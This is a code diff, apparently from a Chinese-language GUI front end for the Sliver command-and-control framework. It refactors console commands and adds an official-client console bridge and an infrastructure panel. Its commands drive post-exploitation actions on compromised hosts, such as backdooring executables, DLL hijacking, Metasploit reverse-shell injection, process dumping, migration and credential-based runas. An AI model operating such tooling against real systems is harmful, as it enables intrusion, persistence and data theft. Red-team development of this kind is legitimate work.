       if (sub === 'stop')  { if (!(await uiConfirm('确定停止此会话的 SOCKS5 代理吗？', { title:'停止 SOCKS5', okLabel:'停止', danger:true }))) return; await App().StopSocksProxy(id); return appendOut(id, '[+] SOCKS5 stopped', 'out'); }
       const p = await App().SocksProxyStatus(id);
       return appendOut(id, p ? `[*] SOCKS5 active on 127.0.0.1:${p}` : '[*] no SOCKS5 proxy running', 'info');
@@ -1915,9 +2174,8 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'grep': {
       if (args.length < 2) return appendOut(id, 'usage: grep [-r] <pattern> <path>', 'err');
-      const recursive = args[0] === '-r';
-      const a2 = recursive ? args.slice(1) : args;
-      const pattern = a2[0], path = a2.slice(1).join(' ');
+      const recursive = Boolean(options.recursive);
+      const pattern = args[0], path = args.slice(1).join(' ');
       const res = await App().GrepFiles(id, pattern, path, recursive);
       return appendOut(id, res, 'out');
     }
@@ -1937,14 +2195,10 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, res, 'out');
     }
     case 'ssh': {
-      if (args.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>  (prompts nothing; add password with -p <pass>)', 'err');
-      let pass = '';
-      const pi = args.indexOf('-p');
-      if (pi >= 0) { pass = args[pi+1]||''; args.splice(pi, 2); }
-      const target = args[0]; const cmd = args.slice(1).join(' ');
-      const at = target.split('@'); if (at.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>', 'err');
-      const user = at[0]; const hp = at[1].split(':'); const host = hp[0]; const port = parseInt(hp[1]||'22');
-      const r = await App().SSHExec(id, host, port, user, pass, cmd);
+      const host = args[0];
+      const command = args.slice(1).join(' ');
+      const user = options.login || tab.obj?.username || '';
+      const r = await App().SSHExec(id, host, Number(options.port || 22), user, options.password || '', command);
       if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
       if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
       if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
@@ -1963,11 +2217,8 @@ async function dispatchCmd(kind, id, raw) {
       catch (e) { return appendOut(id, `[error] ${e}`, 'err'); }
     }
     case 'execute-windows': case 'execw': {
-      const useToken = args.includes('-t'), hide = args.includes('-H');
-      let ppid = 0; const pi = args.indexOf('--ppid'); if (pi >= 0) { ppid = parseInt(args[pi+1])||0; }
-      const rest = args.filter((a,idx) => !a.startsWith('-') && !(pi>=0 && idx===pi+1));
-      if (!rest.length) return appendOut(id, 'usage: execute-windows [-t] [-H] [--ppid <pid>] <path> [args...]', 'err');
-      const r = await App().ExecuteWindowsAdvanced(id, rest[0], rest.slice(1), useToken, hide, ppid);
+      if (!args.length) return appendOut(id, 'usage: execute-windows [-t] [-H] [--ppid <pid>] <path> [args...]', 'err');
+      const r = await App().ExecuteWindowsAdvanced(id, args[0], args.slice(1), Boolean(options.token), Boolean(options.hidden), Number(options.ppid || 0));
       if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
       if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
       if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
@@ -2031,10 +2282,11 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, 'usage: reg query|read|write|read-hive <HIVE> <path> [key] [value]', 'err');
     }
     case 'execute': {
-      // execute [-o|-e|-t|-s ...] <path> [args] — run a program directly (no shell)
-      const rest = args.filter(a => !a.startsWith('-'));
-      if (!rest.length) return appendOut(id, 'usage: execute [-o] <path> [args...]', 'err');
-      const r = await App().RunExecute(id, rest[0], rest.slice(1));
+      if (!args.length) return appendOut(id, commandHelpDetail('execute', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
+      const isWindows = String(tab.obj?.os || '').toLowerCase().includes('windows');
+      const r = isWindows && (options.token || options.hidden || options.ppid)
+        ? await App().ExecuteWindowsAdvanced(id, args[0], args.slice(1), !!options.token, !!options.hidden, Number(options.ppid || 0))
+        : await App().RunExecute(id, args[0], args.slice(1));
       if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
       if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
       if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
@@ -2063,9 +2315,10 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, out.trimEnd() || '(no interfaces)', 'out');
     }
     case 'procdump': {
-      if (!args[0]) return appendOut(id, 'usage: procdump <pid>', 'err');
+      const pid = Number(options.pid || args[0] || 0);
+      if (!pid) return appendOut(id, commandHelpDetail('procdump', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
       appendOut(id, '[*] dumping process memory...', 'pending');
-      const r = await App().ProcessDump(id, parseInt(args[0]));
+      const r = await App().ProcessDump(id, pid);
       return appendOut(id, r.error ? `[error] ${r.error}` : `[+] dumped ${fmtSize(r.bytes)} -> ${r.path}`, r.error?'err':'out');
     }
     case 'extensions': case 'ext-list': {
@@ -2085,9 +2338,10 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, (r.o && r.o.trim()) ? r.o.trimEnd() : '[+] executed (no output)', 'out');
     }
     case 'backdoor': {
-      if (args.length < 2) return appendOut(id, 'usage: backdoor <remote_pe_path> <profile>', 'err');
-      const err = await App().Backdoor(id, args[0], args[1]).then(()=>null).catch(e=>String(e));
-      return appendOut(id, err ? `[error] ${err}` : `[+] backdoored ${args[0]} with profile ${args[1]}`, err?'err':'out');
+      const profile = options.profile || args[1] || '';
+      if (!args[0] || !profile) return appendOut(id, commandHelpDetail('backdoor', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
+      const err = await App().Backdoor(id, args[0], profile).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] backdoored ${args[0]} with profile ${profile}`, err?'err':'out');
     }
     case 'dllhijack': {
       if (args.length < 3) return appendOut(id, 'usage: dllhijack <reference_dll> <target_location> <profile>', 'err');
@@ -2095,14 +2349,16 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, err ? `[error] ${err}` : `[+] DLL hijack planted at ${args[1]}`, err?'err':'out');
     }
     case 'msf': {
-      if (args.length < 3) return appendOut(id, 'usage: msf <payload> <lhost> <lport>   (e.g. windows/x64/meterpreter/reverse_tcp)', 'err');
-      const err = await App().MsfInject(id, args[0], args[1], parseInt(args[2])).then(()=>null).catch(e=>String(e));
+      const payload = options.payload || args[0], lhost = options.lhost || args[1], lport = Number(options.lport || args[2] || 0);
+      if (!payload || !lhost || !lport) return appendOut(id, commandHelpDetail('msf', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
+      const err = await App().MsfInject(id, payload, lhost, lport).then(()=>null).catch(e=>String(e));
       return appendOut(id, err ? `[error] ${err}` : '[+] msf payload staged into the implant process', err?'err':'out');
     }
     case 'msf-inject': {
-      if (args.length < 4) return appendOut(id, 'usage: msf-inject <payload> <lhost> <lport> <pid>', 'err');
-      const err = await App().MsfRemoteInject(id, args[0], args[1], parseInt(args[2]), parseInt(args[3])).then(()=>null).catch(e=>String(e));
-      return appendOut(id, err ? `[error] ${err}` : `[+] msf payload injected into PID ${args[3]}`, err?'err':'out');
+      const payload = options.payload || args[0], lhost = options.lhost || args[1], lport = Number(options.lport || args[2] || 0), pid = Number(options.pid || args[3] || 0);
+      if (!payload || !lhost || !lport || !pid) return appendOut(id, commandHelpDetail('msf-inject', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
+      const err = await App().MsfRemoteInject(id, payload, lhost, lport, pid).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] msf payload injected into PID ${pid}`, err?'err':'out');
     }
     case 'wg-portfwd': {
       const sub = (args[0]||'').toLowerCase();
@@ -2132,20 +2388,20 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, out.trimEnd(), 'out');
     }
     case 'runas': {
-      let user='', pass='', dom='', rest=[];
-      for (let i=0;i<args.length;i++){ if(args[i]==='-u')user=args[++i]||''; else if(args[i]==='-p')pass=args[++i]||''; else if(args[i]==='-d')dom=args[++i]||''; else rest.push(args[i]); }
-      if(!user || !rest.length) return appendOut(id, 'usage: runas -u [DOMAIN\\]<user> [-p <pass>] <program> [args]', 'err');
-      // Split DOMAIN\user (or user@domain) into separate domain + username.
+      let user = options.username || '', pass = options.password || '', dom = options.domain || '';
+      let process = options.process || args[0] || '', processArgs = options.args || args.slice(1).join(' ');
+      if(!user || !process) return appendOut(id, commandHelpDetail('runas', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标'), 'err');
       if (user.includes('\\')) { const p = user.split('\\'); dom = dom || p[0]; user = p[1]; }
       else if (user.includes('@')) { const p = user.split('@'); user = p[0]; dom = dom || p[1]; }
-      if (!dom) dom = '.';   // local account
-      const outp = await App().RunAs(id, user, dom, pass, rest[0], rest.slice(1).join(' '));
+      if (!dom) dom = '.';
+      const outp = await App().RunAs(id, user, dom, pass, process, processArgs);
       return appendOut(id, outp || '[+] done', 'out');
     }
     case 'migrate': {
-      if (args.length < 2) return appendOut(id, 'usage: migrate <pid> <profile>  (profile = a saved implant profile)', 'err');
-      const err = await App().Migrate(id, parseInt(args[0]), args[1]).then(()=>null).catch(e=>String(e));
-      return appendOut(id, err ? `[error] ${err}` : `[+] migration into PID ${args[0]} requested`, err?'err':'out');
+      const pid = Number(options.pid || args[0] || 0), profile = args[options.pid ? 0 : 1] || '';
+      if (!pid || !profile) return appendOut(id, `${commandHelpDetail('migrate', AGENT_COMMAND_SCHEMA, AGENT_COMMAND_HELP, HELP_TEXT, '目标')}\n说明：GUI 还需要一个植入体档案位置参数。`, 'err');
+      const err = await App().Migrate(id, pid, profile).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] migration into PID ${pid} requested`, err?'err':'out');
     }
     case 'execute-shellcode': {
       // execute-shellcode <local-path> [pid]   (no path = file dialog)
@@ -2161,13 +2417,6 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'chmod': { if (args.length < 2) return appendOut(id, 'usage: chmod <path> <mode>  (e.g. 0755)', 'err'); await App().Chmod(id, args[0], args[1]); return appendOut(id, `[+] chmod ${args[1]} ${args[0]}`, 'out'); }
     case 'chown': { if (args.length < 3) return appendOut(id, 'usage: chown <path> <uid> <gid>', 'err'); await App().Chown(id, args[0], args[1], args[2]); return appendOut(id, `[+] chown ${args[1]}:${args[2]} ${args[0]}`, 'out'); }
-    case 'chtimes': case 'timestomp': {
-      if (args.length < 2) return appendOut(id, 'usage: chtimes <path> <YYYY-MM-DD HH:MM:SS>', 'err');
-      const ts = Math.floor(new Date(args.slice(1).join(' ')).getTime()/1000);
-      if (isNaN(ts)) return appendOut(id, 'invalid date — use e.g. 2021-01-01 09:00:00', 'err');
-      await App().Chtimes(id, args[0], ts, ts);
-      return appendOut(id, `[+] timestomped ${args[0]} -> ${args.slice(1).join(' ')}`, 'out');
-    }
     case 'rportfwd': {
       const sub = (args[0]||'').toLowerCase();
       if (sub === 'add') { await App().StartRportFwd(id, '0.0.0.0', parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] reverse forward: target :${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
@@ -2206,9 +2455,7 @@ async function dispatchCmd(kind, id, raw) {
 
       // Remote spawn / jump
       let targetStr = args[1] || '';
-      let pass = '';
-      const pi2 = args.indexOf('-p');
-      if (pi2 >= 0) { pass = args[pi2+1]||''; args.splice(pi2, 2); targetStr = args[1]||''; }
+      const pass = options.password || '';
       const listenerUrl = args[args.length-1] || '';
       // Parse user@host:port
       let user = 'root', host = '', port = 22;
@@ -2285,21 +2532,16 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
     }
     default: {
+      if (contract.official) {
+        return appendOut(id, `[错误] 官方命令 ${contract.spec.commandPath || cmd} 尚未在 GUI 中映射；本次命令未作为目标系统 Shell 命令执行。可输入 official-console 在官方客户端中使用。`, 'err');
+      }
       // Server/panel commands are not session commands — guide instead of
       // silently running them in cmd.exe.
       const serverCmds = { sessions:1, beacons:1, jobs:1, listeners:1, generate:1, profiles:1, builds:1, 'implant-builds':1, operators:1, hosts:1, use:1, background:1, players:1, 'new-operator':1 };
       if (serverCmds[cmd]) {
         return appendOut(id, `[!] '${cmd}' is a server/management command — use the toolbar at the top (this console runs commands on the target). Type 'help' for session commands, or 'shell ${raw}' to force an OS shell.`, 'err');
       }
-      // Otherwise run it in the target's OS shell (cmd.exe / /bin/sh).
-      const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
-      if (!shellCmd.trim()) return;
-      const r = await App().ExecuteCommand(id, shellCmd).catch(e => ({ error: String(e) }));
-      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
-      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
-      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
-      if (r.status && r.status !== 0) appendOut(id, `[exit ${r.status}]`, 'err');
-      return;
+      return appendOut(id, `[错误] 未知目标命令 ${cmd}；请使用 shell <系统命令> 显式执行目标操作系统命令。`, 'err');
     }
   }
 }
@@ -2523,8 +2765,9 @@ async function openInteractiveShell(agentId, obj) {
 
   const outEl = document.getElementById(outId), inEl = document.getElementById(inId);
   const append = t => { if (!outEl) return; outEl.appendChild(document.createTextNode(t)); outEl.scrollTop = outEl.scrollHeight; };
-  const onData = b64 => { try { append(decodeB64(b64)); } catch(e){} };
-  const onClose = () => { append('\n[*] shell closed\n'); if (inEl) inEl.disabled = true; if (window.runtime){ window.runtime.EventsOff(evtOut); window.runtime.EventsOff(evtClose); } };
+  const shellDecoder = createShellOutputDecoder(isWin);
+  const onData = b64 => { try { append(shellDecoder.decode(b64, true)); } catch(e){} };
+  const onClose = () => { append(shellDecoder.flush()); append('\n[*] shell closed\n'); if (inEl) inEl.disabled = true; if (window.runtime){ window.runtime.EventsOff(evtOut); window.runtime.EventsOff(evtClose); } };
   if (window.runtime) { window.runtime.EventsOn(evtOut, onData); window.runtime.EventsOn(evtClose, onClose); }
   if (inEl) {
     inEl.addEventListener('keydown', async e => {
@@ -2537,9 +2780,9 @@ async function openInteractiveShell(agentId, obj) {
   activateTab(dockId);
   setTimeout(() => inEl && inEl.focus(), 30);
 }
-// UTF-8 safe base64 helpers for shell I/O.
+// UTF-8 safe base64 helper for shell input. Output uses shell-decoder.js so
+// Windows GB18030 text and characters split across tunnel frames stay intact.
 function encodeB64(str){ return btoa(unescape(encodeURIComponent(str))); }
-function decodeB64(b64){ return decodeURIComponent(escape(atob(b64))); }
 
 // ── Toolbar nav (views in bottom panel for non-agent views) ────────────────
 function closeToolbarMenus(focusTrigger = false) {
@@ -2580,6 +2823,7 @@ function openToolbarView(view) {
   if (view === 'infrastructure') openInfrastructurePanel();
   if (view === 'extensions') openExtensionCenter();
   if (view === 'team') openTeamCenter();
+  if (view === 'official-console') openOfficialConsolePanel();
   if (view === 'mcp') openMCPPanel();
 }
 
@@ -2606,13 +2850,164 @@ document.addEventListener('keydown', e => { if (e.key === 'Escape' && document.q
 // Config views (Generate, Listeners, Builds, Profiles, Events, Loot, Operators)
 // render in a centered modal window rather than the cramped bottom console.
 function openViewPanel(id, title, content) {
+  if (activeModalID === '_official-console' && id !== '_official-console') disposeOfficialConsoleView(false);
+  activeModalID = id;
   document.getElementById('modal-title').textContent = title;
   document.getElementById('modal-body').innerHTML = content;
-  document.querySelector('#modal-overlay .modal')?.classList.toggle('wide', ['_infrastructure','_extensions','_team','_profiles','_builds','_listeners','scripts','c2profiles','_c2edit','_c2view','_mcp'].includes(id));
+  document.querySelector('#modal-overlay .modal')?.classList.toggle('wide', ['_infrastructure','_extensions','_team','_profiles','_builds','_listeners','scripts','c2profiles','_c2edit','_c2view','_mcp','_official-console'].includes(id));
   document.getElementById('modal-overlay').classList.remove('hidden');
 }
-function hideModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
+function hideModal() {
+  if (activeModalID === '_official-console') disposeOfficialConsoleView(false);
+  activeModalID = '';
+  document.getElementById('modal-overlay').classList.add('hidden');
+}
 document.getElementById('modal-close').addEventListener('click', hideModal);
+
+function bytesToBase64(bytes) {
+  let binary = '';
+  for (let offset = 0; offset < bytes.length; offset += 0x8000) {
+    binary += String.fromCharCode(...bytes.subarray(offset, offset + 0x8000));
+  }
+  return btoa(binary);
+}
+
+function base64ToBytes(value) {
+  const binary = atob(value || '');
+  const bytes = new Uint8Array(binary.length);
+  for (let index = 0; index < binary.length; index++) bytes[index] = binary.charCodeAt(index);
+  return bytes;
+}
+
+function queueOfficialConsoleInput(value) {
+  const encoded = bytesToBase64(new TextEncoder().encode(value));
+  const write = officialConsoleWriteChain.catch(() => {}).then(() => App().WriteOfficialConsole(encoded));
+  officialConsoleWriteChain = write.catch(() => {});
+  return write;
+}
+
+function disposeOfficialConsoleView(stopProcess) {
+  if (officialResizeObserver) officialResizeObserver.disconnect();
+  officialResizeObserver = null;
+  if (officialTerminal) officialTerminal.dispose();
+  officialTerminal = null;
+  officialFitAddon = null;
+  if (stopProcess) App().StopOfficialConsole().catch(() => {});
+}
+
+function wireOfficialConsoleStream() {
+  if (!window.runtime) return;
+  window.runtime.EventsOff('official-console:output');
+  window.runtime.EventsOff('official-console:exit');
+  window.runtime.EventsOn('official-console:output', encoded => {
+    const bytes = base64ToBytes(encoded);
+    if (officialTerminal) officialTerminal.write(bytes);
+  });
+  window.runtime.EventsOn('official-console:exit', payload => {
+    const stopped = payload?.stopped;
+    const message = `[官方控制台${stopped ? '已停止' : `已退出，代码 ${payload?.exitCode ?? '-'}`}]`;
+    if (officialTerminal) officialTerminal.write(`\r\n\x1b[33m${message}\x1b[0m\r\n`);
+    const state = document.getElementById('official-console-state');
+    if (state) state.textContent = stopped ? '已停止' : `官方客户端已退出，代码 ${payload?.exitCode ?? '-'}`;
+  });
+}
+
+function officialConsoleStatusLine(status = {}) {
+  if (!status.supported) return status.message || '当前系统不支持官方控制台桥接';
+  if (status.running) return `运行中 · PID ${status.pid || '-'} · 输入由官方客户端原样处理`;
+  return status.configured ? '已配置，等待启动' : '尚未配置官方客户端路径';
+}
+
+async function renderOfficialConsolePanel() {
+  const status = await App().GetOfficialConsoleStatus().catch(error => ({ error }));
+  const body = document.getElementById('modal-body');
+  if (!body || activeModalID !== '_official-console') return;
+  if (status.error) {
+    body.innerHTML = rpcErrorHtml(status.error, '无法读取官方控制台配置');
+    return;
+  }
+  body.innerHTML = `<div class="official-console-panel">
+    <div class="official-console-toolbar">
+      <div class="official-console-paths">
+        <label>官方客户端<input id="official-client-path" value="${esc(status.clientPath || '')}" placeholder="选择 sliver-client.exe" spellcheck="false"/></label>
+        <span>当前操作员配置：${esc(status.configPath || '尚未连接')}</span>
+      </div>
+      <div class="official-console-actions">
+        <button class="btn small" id="official-client-pick">选择</button>
+        <button class="btn small" id="official-client-save">保存路径</button>
+        <button class="btn small accent" id="official-console-start">${status.running ? '重启' : '启动'}</button>
+        <button class="btn small" id="official-console-stop" ${status.running ? '' : 'disabled'}>停止</button>
+        <button class="btn small" id="official-console-clear">清屏</button>
+      </div>
+    </div>
+    <div id="official-console-state" class="official-console-state">${esc(officialConsoleStatusLine(status))}</div>
+    <div id="official-terminal" class="official-terminal"></div>
+  </div>`;
+
+  const terminalHost = body.querySelector('#official-terminal');
+  officialTerminal = new Terminal({
+    cursorBlink: true,
+    convertEol: false,
+    fontFamily: 'Cascadia Mono, Consolas, monospace',
+    fontSize: 13,
+    scrollback: 10000,
+    theme: { background: '#0b0d10', foreground: '#d8dee9', cursor: '#70d6a5', selectionBackground: '#365b4c' },
+  });
+  officialFitAddon = new FitAddon.FitAddon();
+  officialTerminal.loadAddon(officialFitAddon);
+  officialTerminal.open(terminalHost);
+  officialFitAddon.fit();
+  officialTerminal.onData(data => {
+    queueOfficialConsoleInput(data).catch(error => {
+      const info = rpcError(error, '官方控制台输入失败');
+      if (!String(info.detail || '').includes('未运行')) toast('err', info.message);
+    });
+  });
+  officialResizeObserver = new ResizeObserver(() => {
+    if (!officialTerminal || !officialFitAddon) return;
+    officialFitAddon.fit();
+    App().ResizeOfficialConsole(officialTerminal.cols, officialTerminal.rows).catch(() => {});
+  });
+  officialResizeObserver.observe(terminalHost);
+
+  body.querySelector('#official-client-pick').addEventListener('click', async () => {
+    const path = await App().PickOfficialClient().catch(error => { toastRpcError(error, '选择官方客户端失败'); return ''; });
+    if (path) body.querySelector('#official-client-path').value = path;
+  });
+  body.querySelector('#official-client-save').addEventListener('click', async () => {
+    const path = body.querySelector('#official-client-path').value.trim();
+    const result = await App().SetOfficialClientPath(path).catch(error => ({ error }));
+    if (result.error) return toastRpcError(result.error, '保存官方客户端路径失败');
+    toast('ok', '官方客户端路径已保存到 config.yaml');
+    body.querySelector('#official-console-state').textContent = officialConsoleStatusLine(result);
+  });
+  body.querySelector('#official-console-start').addEventListener('click', async () => {
+    const path = body.querySelector('#official-client-path').value.trim();
+    const saved = await App().SetOfficialClientPath(path).catch(error => ({ error }));
+    if (saved.error) return toastRpcError(saved.error, '保存官方客户端路径失败');
+    await App().StopOfficialConsole().catch(() => {});
+    officialTerminal.clear();
+    const started = await App().StartOfficialConsole(officialTerminal.cols, officialTerminal.rows).catch(error => ({ error }));
+    if (started.error) return toastRpcError(started.error, '启动官方控制台失败');
+    body.querySelector('#official-console-state').textContent = officialConsoleStatusLine(started);
+    body.querySelector('#official-console-stop').disabled = false;
+    officialTerminal.focus();
+  });
+  body.querySelector('#official-console-stop').addEventListener('click', async () => {
+    const error = await App().StopOfficialConsole().then(() => null).catch(error => error);
+    if (error) return toastRpcError(error, '停止官方控制台失败');
+    body.querySelector('#official-console-stop').disabled = true;
+  });
+  body.querySelector('#official-console-clear').addEventListener('click', () => officialTerminal?.clear());
+  if (status.running) officialTerminal.write('\x1b[33m官方客户端进程已在运行；关闭此窗口不会停止该进程。\x1b[0m\r\n');
+  else officialTerminal.write('\x1b[90m选择与 Teamserver 匹配的官方客户端，然后点击“启动”。\x1b[0m\r\n');
+}
+
+async function openOfficialConsolePanel() {
+  disposeOfficialConsoleView(false);
+  openViewPanel('_official-console', '官方 Sliver 控制台', '<div class="compat-loading"><span class="spinner"></span>正在读取桥接配置...</div>');
+  await renderOfficialConsolePanel();
+}
 
 function compatibilityStatus(status) {
   if (status === 'available') return { label: '可用', cls: 'ok' };
@@ -2632,6 +3027,12 @@ async function openCompatibilityPanel() {
 
   const gui = snapshot.gui || {};
   const dependencies = gui.dependencies || {};
+  const negotiation = snapshot.negotiation || {};
+  const negotiationStatus = negotiation.mode === 'incompatible'
+    ? { label: '需谨慎', cls: 'err' }
+    : negotiation.mode === 'unknown'
+      ? { label: '逐项探测', cls: 'empty' }
+      : { label: negotiation.mode === 'forward' ? '自动适配' : '兼容', cls: 'ok' };
   const generatedAt = snapshot.generatedAt ? new Date(snapshot.generatedAt).toLocaleString() : '-';
   const items = (snapshot.items || []).map(item => {
     const status = compatibilityStatus(item.status);
@@ -2652,10 +3053,18 @@ async function openCompatibilityPanel() {
       <div><span>GUI 版本</span><strong>${esc(gui.version || 'dev')} · ${esc(gui.gitCommit || 'unknown')}</strong></div>
       <div><span>Wails</span><strong>${esc(dependencies.wails || 'unknown')}</strong></div>
       <div><span>Sliver 客户端依赖</span><strong>${esc(dependencies.sliver || 'unknown')}</strong></div>
+      <div><span>Server 版本</span><strong>${esc(negotiation.serverVersion || 'unknown')}</strong></div>
       <div><span>Protobuf</span><strong>${esc(dependencies.protobuf || 'unknown')}</strong></div>
       <div><span>检测时间</span><strong>${esc(generatedAt)}</strong></div>
     </div>
     <div class="compat-note">此页面仅调用只读 RPC，不会修改远程团队服务器配置。</div>
+    <section class="compat-item">
+      <div class="compat-item-head">
+        <div><h3>${esc(negotiation.label || '版本关系未知')}</h3><p>${esc(negotiation.summary || '客户端将按逐项 RPC 结果判断能力。')}</p></div>
+        <span class="compat-badge ${negotiationStatus.cls}">${negotiationStatus.label}</span>
+      </div>
+      <div class="compat-tags"><span>客户端基线：${esc(negotiation.clientBaseline || dependencies.sliver || 'unknown')}</span><span>已知 RPC：${negotiation.continueKnownRpcs === false ? '谨慎使用' : '继续启用'}</span><span>全新 RPC：需客户端适配</span></div>
+    </section>
     <section class="compat-item">
       <div class="compat-item-head">
         <div><h3>客户端侧 MCP</h3><p>当前 GUI 依赖已包含实验性 MCP HTTP/SSE 服务。服务在本机运行并复用当前连接，不表示远程 Teamserver 自身开放了 MCP。</p></div>
@@ -2758,6 +3167,7 @@ function endpointParts(value) {
 }
 
 async function openInfrastructurePanel() {
+  infrastructurePanelState = null;
   openViewPanel('_infrastructure', '网络基础设施', '<div class="infra-loading"><span class="spinner"></span>正在汇总 Pivot 与活动转发（最多等待 8 秒）...</div>');
   let snapshot;
   let timeoutID;
@@ -2777,25 +3187,57 @@ async function openInfrastructurePanel() {
   renderInfrastructurePanel(snapshot || { nodes: [], routes: [], warnings: [] });
 }
 
-function renderInfrastructurePanel(snapshot) {
-  const nodes = snapshot.nodes || [], routes = snapshot.routes || [];
-  const sessionOptions = nodes.filter(node => node.status === 'online').map(node =>
-    `<option value="${esc(node.id)}">${esc(node.name || node.id.slice(0, 8))} · ${esc(node.transport || '未知传输')}</option>`).join('');
-  const routeOptions = Object.entries(INFRA_ROUTE_LABELS).filter(([key]) => key !== 'pivot-namedpipe').map(([key, value]) => `<option value="${key}">${value}</option>`).join('');
-  const nodeRows = nodes.map(node => {
+function currentInfrastructureData(snapshot) {
+  const sessions = availableSessions();
+  const sessionIDs = new Set(sessions.map(session => session.id));
+  const nodes = (snapshot.nodes || []).filter(node => sessionIDs.has(node.id)).map(node => ({
+    ...node,
+    status: 'online',
+    downstream: (node.downstream || []).filter(id => sessionIDs.has(id)),
+  }));
+  const routes = (snapshot.routes || []).filter(route => !route.sessionId || sessionIDs.has(route.sessionId));
+  return { sessions, sessionIDs, nodes, routes };
+}
+
+function infrastructureNodeRows(nodes) {
+  return nodes.map(node => {
     const impacted = node.downstream || [];
     const parent = nodes.find(item => item.id === node.parentId);
-    return `<div class="infra-node ${node.status === 'offline' ? 'offline' : ''}">
-      <div class="infra-node-head"><strong>${esc(node.name || node.id.slice(0, 8))}</strong><span class="state ${esc(node.status)}">${node.status === 'online' ? '在线' : '离线'}</span></div>
+    return `<div class="infra-node">
+      <div class="infra-node-head"><strong>${esc(node.name || node.id.slice(0, 8))}</strong><span class="state online">在线</span></div>
       <div>${esc(node.address || '-')} · ${esc(node.transport || '未知传输')}</div>
-      <div>上游：${esc(parent?.name || (node.parentId ? node.parentId.slice(0, 8) : 'Teamserver'))}</div>
+      <div>上游：${esc(parent?.name || 'Teamserver')}</div>
       <div class="infra-impact">下游影响：${impacted.length ? `${impacted.length} 个（${impacted.map(id => id.slice(0, 8)).join('、')}）` : '无'}</div>
     </div>`;
-  }).join('') || '<div class="empty-state">暂无在线或历史 Session 节点</div>';
+  }).join('') || '<div class="empty-state">暂无在线 Session 节点</div>';
+}
+
+function syncInfrastructurePanel() {
+  const state = infrastructurePanelState;
+  if (!state || document.getElementById('modal-overlay')?.classList.contains('hidden')) return;
+  const nodeContainer = document.querySelector('#modal-body .infra-nodes');
+  if (!nodeContainer) return;
+  const data = currentInfrastructureData(state.snapshot);
+  nodeContainer.innerHTML = infrastructureNodeRows(data.nodes);
+  const filter = document.getElementById('infra-session-filter');
+  const create = document.getElementById('infra-create-session');
+  replaceSessionOptions(filter, data.sessions, '全部 Session');
+  const createInvalidated = replaceSessionOptions(create, data.sessions, '无在线 Session', true);
+  state.data = data;
+  state.drawRoutes();
+  if (createInvalidated || !create?.value) state.runPreflight();
+}
+
+function renderInfrastructurePanel(snapshot) {
+  const data = currentInfrastructureData(snapshot);
+  const nodes = data.nodes;
+  const sessionOptions = data.sessions.map(session => `<option value="${esc(session.id)}">${esc(sessionOptionLabel(session))}</option>`).join('');
+  const routeOptions = Object.entries(INFRA_ROUTE_LABELS).filter(([key]) => key !== 'pivot-namedpipe').map(([key, value]) => `<option value="${key}">${value}</option>`).join('');
+  const nodeRows = infrastructureNodeRows(nodes);
   const warningHtml = (snapshot.warnings || []).map(item => `<div class="infra-warning">${esc(item)}</div>`).join('');
   const html = `<div class="infra-center">
     ${warningHtml}
-    <section class="infra-section"><div class="section-heading"><div><h3>拓扑与影响范围</h3><p>Pivot 树来自 Teamserver；失联节点会同步标出其下游影响。</p></div><button class="btn small" id="infra-refresh">刷新</button></div><div class="infra-nodes">${nodeRows}</div></section>
+    <section class="infra-section"><div class="section-heading"><div><h3>拓扑与影响范围</h3><p>Pivot 树来自 Teamserver；这里只显示当前在线且未隐藏的 Session。</p></div><button class="btn small" id="infra-refresh">刷新</button></div><div class="infra-nodes">${nodeRows}</div></section>
     <section class="infra-section"><div class="section-heading"><div><h3>活动路由</h3><p>统一查看和停止 SOCKS、端口转发、WireGuard 与 Pivot。</p></div></div>
       <div class="infra-filters"><select id="infra-type-filter"><option value="">全部类型</option>${routeOptions}</select><select id="infra-session-filter"><option value="">全部 Session</option>${sessionOptions}</select><select id="infra-status-filter"><option value="">全部状态</option><option value="online">在线</option><option value="offline">离线</option></select><select id="infra-source-filter"><option value="">全部来源</option><option value="teamserver">Teamserver</option><option value="client">客户端本地</option></select></div>
       <div class="table-wrap"><table class="data-table infra-table"><thead><tr><th>类型</th><th>Session</th><th>监听</th><th>目标</th><th>状态</th><th>来源</th><th></th></tr></thead><tbody id="infra-routes"></tbody></table></div>
